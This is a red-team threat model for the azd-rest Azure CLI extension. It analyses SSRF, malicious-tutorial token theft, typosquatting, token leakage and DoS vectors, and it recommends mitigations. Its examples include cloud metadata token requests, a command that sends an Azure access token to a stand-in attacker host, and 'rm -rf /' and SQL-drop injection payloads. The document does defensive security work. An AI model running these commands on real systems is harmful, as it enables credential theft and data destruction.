---
title: Threat Model & Attack Vector Analysis
description: Security threat analysis from adversarial perspective
lastUpdated: 2026-01-09
tags: [security, threat-model, red-team]
classification: confidential
---

# Threat Model & Attack Vector Analysis - azd-rest

**Date**: January 9, 2026  
**Perspective**: Red Team / Adversarial Security Analysis  
**Classification**: CONFIDENTIAL - Security Research

## Executive Summary

This document analyzes potential attack vectors from a malicious actor's perspective. While the current implementation is **secure against direct code injection**, several social engineering and SSRF (Server-Side Request Forgery) attack vectors exist that could **exploit user trust** in the azd ecosystem.

**Risk Level**: ⚠️ **MEDIUM** (Not due to code vulnerabilities, but trust exploitation and SSRF vectors)

---

## Attack Vectors

### 🔴 HIGH RISK: Server-Side Request Forgery (SSRF)

#### Attack 1: Internal Network Scanning

**Attacker Goal**: Discover internal services and resources by making requests to internal endpoints.

**Attack Scenario**:
```bash
# Attacker convinces user to run this (disguised as "health check")
azd rest get http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Or scan internal network
azd rest get http://10.0.0.1:8080/admin
azd rest get http://localhost:3000/internal-api
azd rest get http://127.0.0.1:5432/database
```

**Why This Works**:
- ✅ User explicitly provides URLs (by design)
- ✅ No URL validation beyond basic parsing in CLI mode
- ❌ MCP server blocks private IP ranges, loopback, link-local, and cloud metadata endpoints
- ❌ MCP server validates DNS resolution against blocked CIDRs

**Impact**: 
- Internal network reconnaissance
- Access to internal services
- Cloud metadata endpoint access (IMDS)
- Potential credential exfiltration from metadata services

---

#### Attack 2: Cloud Metadata Service Exploitation

**Attacker Goal**: Access cloud instance metadata to steal credentials, tokens, or sensitive configuration.

**Attack Scenario**:
```bash
# Azure Instance Metadata Service (IMDS)
azd rest get http://169.254.169.254/metadata/instance?api-version=2021-02-01

# AWS Instance Metadata Service
azd rest get http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud Metadata
azd rest get http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Why This Works**:
- ✅ Metadata services accessible from within cloud instances (CLI mode)
- ❌ MCP server blocks 169.254.169.254 and other metadata endpoints
- ✅ Often contain sensitive credentials and tokens
- ✅ No authentication required from localhost

**Impact**: 
- Complete cloud instance compromise
- Access to all resources accessible by instance identity
- Lateral movement within cloud environment

---

#### Attack 3: Internal Service Exploitation

**Attacker Goal**: Access internal services that shouldn't be exposed externally.

**Attack Scenario**:
```bash
# Access internal admin APIs
azd rest get http://internal-admin.example.com/api/users

# Access internal databases
azd rest get http://internal-db.example.com:5432/query?sql=SELECT+*+FROM+users

# Access internal file shares
azd rest get http://internal-fileshare.example.com/shared/secrets.txt
```

**Why This Works**:
- ✅ Internal services often have weaker authentication
- ✅ May trust requests from internal network
- ✅ User running azd-rest may have network access to internal services
- ✅ No URL validation prevents internal endpoints

**Impact**: 
- Unauthorized access to internal services
- Data exfiltration
- Privilege escalation within internal network

---

### 🟡 MEDIUM RISK: Social Engineering Attacks

#### Attack 4: Malicious URL Disguised as Tutorial

**Attacker Goal**: Get users to make requests to attacker-controlled endpoints.

**Attack Scenario**:
```bash
# Victim finds this in a "helpful" blog post
# Title: "Quick script to check Azure resource health"

azd rest get https://attacker-site.com/health-check?token=$(az account get-access-token --query accessToken -o tsv)

# OR more subtle - attacker-controlled Azure endpoint
azd rest get https://malicious-subscription.management.azure.com/subscriptions?api-version=2020-01-01
```

**Malicious Endpoint Behavior**:
```python
# Attacker's server logs:
# - User's Azure access token
# - User's IP address
# - User agent and headers
# - Any query parameters

# Attacker then uses token to:
# - List all user's Azure resources
# - Create new resources
# - Delete existing resources
# - Exfiltrate data
```

**Why This Works**:
- ✅ User **trusts** azd is secure (it is!)
- ✅ Request includes **Azure authentication token**
- ✅ Attacker can log and reuse tokens
- ✅ Looks legitimate if posted on Stack Overflow or dev blogs

**Impact**: 
- Complete Azure subscription compromise
- Token exfiltration and reuse
- Resource creation/deletion
- Data exfiltration

---

#### Attack 5: Typosquatting via Extension Registry

**Attacker Goal**: Get users to install malicious azd extension.

**Attack Scenario**:
```bash
# User types this by mistake:
azd extension install azd-rest-pro  # "Pro" version sounds better!
azd extension install azd-rests      # Missing 't' in 'rest'

# Attacker registers these similar names and publishes malicious extensions
```

**Malicious Extension Strategy**:
1. Clone legitimate azd-rest extension
2. Add telemetry/exfiltration code that logs all URLs and tokens
3. Publish to extension registry with similar name
4. SEO optimization to rank higher in search results

**Detection Difficulty**: HIGH (looks identical to legitimate extension)

---

### 🟡 MEDIUM RISK: Token Exfiltration

#### Attack 6: Verbose Mode Token Leakage

**Attacker Goal**: Extract tokens from verbose output logs.

**Attack Scenario**:
```bash
# User runs with verbose mode and logs output
azd rest get https://management.azure.com/subscriptions?api-version=2020-01-01 --verbose > output.log

# Attacker gains access to log file
# Token is redacted, but...

# If redaction fails or is bypassed:
> Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc...
```

**Why This Works**:
- ✅ Tokens are redacted in verbose output (mitigated)
- ⚠️ But if redaction logic has bugs, tokens could leak
- ⚠️ Error messages might expose tokens
- ⚠️ Log files might be stored insecurely

**Mitigation**: ✅ Token redaction implemented in verbose output

---

#### Attack 7: Environment Variable Token Leakage

**Attacker Goal**: Extract tokens from environment variables.

**Attack Scenario**:
```bash
# User sets Azure credentials in environment
export AZURE_CLIENT_SECRET="super-secret-value-123"

# Attacker's malicious script/process reads environment
env | grep AZURE
```

**Why This Works**:
- ✅ azd-rest uses Azure DefaultAzureCredential
- ✅ Credentials may be in environment variables
- ✅ Other processes can read environment variables
- ✅ Logs might contain environment variable dumps

**Mitigation**: ✅ azd-rest doesn't log environment variables

---

### 🟡 MEDIUM RISK: Request Manipulation

#### Attack 8: Header Injection

**Attacker Goal**: Inject malicious headers to bypass security controls.

**Attack Scenario**:
```bash
# Try to inject Host header
azd rest get http://example.com \
  --header "Host: malicious-site.com"

# Try to inject Authorization header (should be blocked)
azd rest get http://example.com \
  --header "Authorization: Bearer malicious-token"
```

**Why This Might Work**:
- ✅ User can provide custom headers
- ⚠️ Some headers might override security controls
- ⚠️ Host header manipulation could redirect requests

**Mitigation**: ✅ Authorization header is set by azd-rest (user headers are additional)

---

#### Attack 9: Request Body Manipulation

**Attacker Goal**: Inject malicious content in request bodies.

**Attack Scenario**:
```bash
# SQL injection in request body
azd rest post https://api.example.com/query \
  --data '{"query":"SELECT * FROM users WHERE id=1; DROP TABLE users;"}'

# Command injection in JSON
azd rest post https://api.example.com/exec \
  --data '{"command":"rm -rf /"}'
```

**Why This Works**:
- ✅ User controls request body content
- ✅ No validation of request body (by design)
- ✅ API endpoints might be vulnerable to injection

**Impact**: Depends on target API's security, not azd-rest itself

---

### 🟢 LOW RISK: Denial of Service

#### Attack 10: Resource Exhaustion

**Attacker Goal**: Consume system resources or API quotas.

**Attack Scenario**:
```bash
# Rapid-fire requests to exhaust API quota
for i in {1..1000}; do
  azd rest get https://management.azure.com/subscriptions?api-version=2020-01-01 &
done
```

**Why This Works**:
- ✅ No rate limiting in CLI mode (user controls invocation)
- ❌ MCP server has rate limiting (10 burst / 1 per second)
- ✅ Could exhaust Azure API quotas via CLI
- ✅ Could consume local network/CPU resources

**Mitigation**: MCP server rate-limited. CLI relies on operating system and Azure service limits.

---

#### Attack 11: Large Response Handling

**Attacker Goal**: Cause memory exhaustion with large responses.

**Attack Scenario**:
```bash
# Request endpoint that returns huge response
azd rest get https://api.example.com/large-dataset
# Response is 10GB JSON
```

**Why This Works**:
- ⚠️ CLI has 100MB response size limit
- ⚠️ MCP server has 10MB response size limit
- ✅ Very large responses could still consume significant memory within limits

**Mitigation**: ✅ Response size limits enforced (100MB CLI, 10MB MCP). OS memory limits also apply.

---

## Exploitation Scenarios

### Scenario 1: Compromised CI/CD Pipeline

**Setup**:
```yaml
# .github/workflows/deploy.yml
- name: Check resource health
  run: |
    azd rest get ${{ secrets.INTERNAL_HEALTH_CHECK_URL }}
```

**Attack**:
1. Attacker compromises GitHub secrets or creates fake repository
2. Sets `INTERNAL_HEALTH_CHECK_URL` to attacker-controlled endpoint
3. Every CI/CD run sends Azure tokens to attacker
4. Attacker uses tokens to access Azure resources

**Impact**: Supply chain compromise affecting multiple projects.

---

### Scenario 2: Watering Hole Attack

**Setup**:
- Popular Azure developer blog publishes "helpful API examples"
- Attackers compromise blog or submit malicious guest post

**Attack Flow**:
```
1. Developer reads blog post: "Quick way to check Azure resource status!"
2. Copies command: azd rest get https://blog-example.com/check-health
3. Request includes Azure authentication token
4. Attacker logs token and uses it to:
   - List all Azure resources
   - Create new resources
   - Exfiltrate data
```

---

### Scenario 3: Internal Threat / Malicious Insider

**Setup**:
- Disgruntled employee has access to company documentation
- Adds malicious URL to internal runbook

**Attack**:
```bash
# Added to company's internal "health-check.sh":
azd rest get https://internal-health.example.com/check

# But internal-health.example.com is actually:
# - Attacker-controlled server
# - Logs all requests with tokens
# - Forwards to legitimate endpoint to avoid detection
```

**Detection Difficulty**: HIGH (runs in context of legitimate user)

---

## Defense Evasion Techniques

### Technique 1: URL Obfuscation

**Attacker Strategy**: Hide malicious intent through URL encoding.

```bash
# Looks innocent:
azd rest get https://example.com/api

# But actually:
azd rest get http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
# (Using IP instead of hostname)
```

### Technique 2: Redirect Chains

**Attacker Strategy**: Use redirects to hide final destination.

```bash
# Initial request looks safe
azd rest get https://legitimate-site.com/redirect

# But redirects to:
# https://legitimate-site.com/redirect → http://169.254.169.254/metadata
```

### Technique 3: Living Off The Land (LOLBins)

**Attacker Strategy**: Use only legitimate Azure tools.

```bash
# Only uses legitimate Azure CLI/azd commands:
azd rest get https://management.azure.com/subscriptions?api-version=2020-01-01

# But URL is attacker-controlled Azure subscription
# Attacker logs all requests and tokens
```

---

## Risk Assessment Matrix

| Attack Vector | Likelihood | Impact | Risk Level | Mitigated? |
|--------------|------------|--------|------------|------------|
| SSRF - Internal Network (MCP) | LOW | **CRITICAL** | 🟢 LOW | ✅ **YES** (blocked CIDRs, DNS validation) |
| SSRF - Internal Network (CLI) | **HIGH** | **CRITICAL** | 🔴 CRITICAL | ❌ No (by design, user-controlled) |
| SSRF - Cloud Metadata (MCP) | LOW | **CRITICAL** | 🟢 LOW | ✅ **YES** (blocked hosts) |
| SSRF - Cloud Metadata (CLI) | **HIGH** | **CRITICAL** | 🔴 CRITICAL | ❌ No (by design) |
| SSRF - Internal Services (MCP) | LOW | HIGH | 🟢 LOW | ✅ **YES** (blocked CIDRs) |
| Malicious URL Tutorial | **HIGH** | **CRITICAL** | 🔴 CRITICAL | ❌ No |
| Typosquatting Extension | MEDIUM | HIGH | 🟡 HIGH | ❌ No |
| Token Exfiltration (Verbose) | LOW | HIGH | 🟢 LOW | ✅ **YES** (redaction) |
| Token Exfiltration (Env) | LOW | HIGH | 🟢 LOW | ⚠️ Partial |
| Header Injection (MCP) | LOW | MEDIUM | 🟢 LOW | ✅ **YES** (blocked headers) |
| Header Injection (CLI) | LOW | MEDIUM | 🟢 LOW | ⚠️ Partial |
| Request Body Injection | LOW | MEDIUM | 🟢 LOW | N/A (API-dependent) |
| Resource Exhaustion (MCP) | LOW | LOW | 🟢 LOW | ✅ **YES** (rate limiting) |
| Resource Exhaustion (CLI) | LOW | LOW | 🟢 LOW | ⚠️ Partial (OS limits) |
| Large Response (MCP) | LOW | LOW | 🟢 LOW | ✅ **YES** (10MB limit) |
| Large Response (CLI) | LOW | LOW | 🟢 LOW | ✅ **YES** (100MB limit) |
| CI/CD Pipeline Compromise | MEDIUM | **CRITICAL** | 🟡 HIGH | ❌ No |

---

## Recommended Mitigations

### 🔴 CRITICAL: User Education

**Recommendation**: Create security documentation warning users about:

1. **Never make requests to untrusted endpoints**:
   ```bash
   # ❌ DANGEROUS:
   azd rest get https://random-blog.com/api/check
   
   # ✅ SAFER:
   # Verify endpoint first, then:
   azd rest get https://trusted-official-site.com/api/check
   ```

2. **Be cautious with internal network endpoints**:
   - Internal endpoints may be accessible from your network
   - Cloud metadata endpoints are accessible from cloud instances
   - Use `--no-auth` for public APIs that don't need authentication

3. **Verify URLs before executing**:
   - Check URL matches official Azure documentation
   - Verify domain ownership
   - Use official Azure REST API documentation

### 🟡 HIGH: Implement Security Features

**Recommendation 1: URL Validation** (Optional)

```go
// Add optional --allow-internal flag:
azd rest get http://169.254.169.254/metadata --allow-internal=false

// Blocks:
// - Private IP ranges (10.x, 172.16.x, 192.168.x)
// - Localhost (127.0.0.1, localhost)
// - Cloud metadata endpoints (169.254.169.254)
```

**Recommendation 2: Request Logging** (Optional)

```bash
# Log all requests to audit file:
# ~/.azd/rest-audit.log
2026-01-09T10:30:45Z user=developer url=https://management.azure.com/... method=GET status=200
```

**Recommendation 3: Rate Limiting** (Optional)

```bash
# Limit requests per minute:
azd rest get https://api.example.com/resource --rate-limit 10/min
```

### 🟢 MEDIUM: Additional Security Layers

**Recommendation 1: URL Allowlist** (Future Enhancement)

Allow users to define trusted URL patterns in `~/.azd/config.json`:
```json
{
  "rest": {
    "trustedDomains": [
      "management.azure.com",
      "*.vault.azure.net",
      "graph.microsoft.com"
    ],
    "blockUntrusted": false
  }
}
```

**Recommendation 2: Request Signing** (Future Enhancement)

Sign requests with user's key to prevent tampering:
```bash
azd rest get https://api.example.com/resource --sign
```

---

## Detection & Monitoring

### Indicators of Compromise (IOCs)

Users should monitor for:

1. **Unexpected network connections**:
   ```bash
   # Monitor with:
   sudo tcpdump -i any -w rest-traffic.pcap &
   azd rest get https://api.example.com/resource
   ```

2. **Requests to metadata endpoints**:
   ```bash
   # Check audit logs for:
   # - 169.254.169.254 (cloud metadata)
   # - 127.0.0.1 (localhost)
   # - 10.x, 172.16.x, 192.168.x (private IPs)
   ```

3. **Unexpected Azure resource creation**:
   ```bash
   az resource list --query "[].{name:name, type:type, created:createdTime}" -o table
   ```

### Security Telemetry

**Optional telemetry to detect attacks**:
```go
// Report (anonymized) to Azure telemetry:
type RequestTelemetry struct {
    URLHashSHA256    string
    Method           string
    StatusCode       int
    ResponseTime     time.Duration
    IsInternalIP     bool
    IsMetadataEndpoint bool
}
```

---

## Conclusion

### Current Security Posture

✅ **Code Security**: Excellent
- No code injection vulnerabilities
- No path traversal vulnerabilities
- Proper input validation
- Safe HTTP client configuration
- Token redaction in verbose output

❌ **Design Security**: SSRF partially mitigated
- **CLI mode**: Users explicitly provide URLs (by design), so SSRF is inherent
- **MCP server**: Comprehensive SSRF protections implemented:
  - Blocked CIDR ranges (private IPs, loopback, link-local)
  - Blocked hosts (cloud metadata endpoints: 169.254.169.254, etc.)
  - DNS resolution validation against blocked CIDRs
  - Rate limiting (10 burst / 1 per second)
  - Disabled redirects
  - Blocked sensitive headers (Authorization, Cookie, etc.)
  - 10MB response size limit

### Key Insight

> **The primary risk is not a vulnerability in azd-rest itself, but the inherent SSRF risk of making HTTP requests to user-specified endpoints.**

Attackers will:
1. Exploit **social engineering** (malicious tutorials, blog posts)
2. Leverage **SSRF** (internal network, metadata endpoints)
3. Use **legitimate functionality** (user-provided URLs)

### Security Philosophy

azd-rest follows the **"sharp tools" philosophy**:
- It's a **power tool** for developers
- It **trusts the user** to know what endpoints they're calling
- It **doesn't attempt to restrict** URL access (by design)
- **User responsibility** for endpoint validation

This is appropriate for a developer tool, but requires:
- 📚 **Strong user education**
- ⚠️ **Clear security warnings in documentation**
- 🔍 **Optional security features** (URL validation, audit logging)

### Priority Recommendations

1. **CRITICAL**: Add SSRF warnings to README and documentation ✅ **DONE** (security page on website)
2. **HIGH**: Implement optional URL validation (block internal IPs by default) ✅ **DONE** (MCP server: blockedCIDRs, blockedHosts, DNS validation)
3. **MEDIUM**: Add audit logging (future enhancement)
4. **LOW**: Consider rate limiting for future versions ✅ **DONE** (MCP server: 10 burst / 1 per second)

---

## Responsible Disclosure

This threat model is provided for security research and defensive purposes only. Any actual exploitation of these attack vectors against real users would be:
- **Illegal** under computer fraud laws (CFAA, etc.)
- **Unethical** and harmful to the developer community
- **Reported** to appropriate authorities

**If you discover a security vulnerability, please report it responsibly to the maintainers.**

---

**Classification**: CONFIDENTIAL - Security Research  
**Author**: GitHub Copilot Security Analysis  
**Date**: January 9, 2026  
**Status**: For Internal Security Review Only
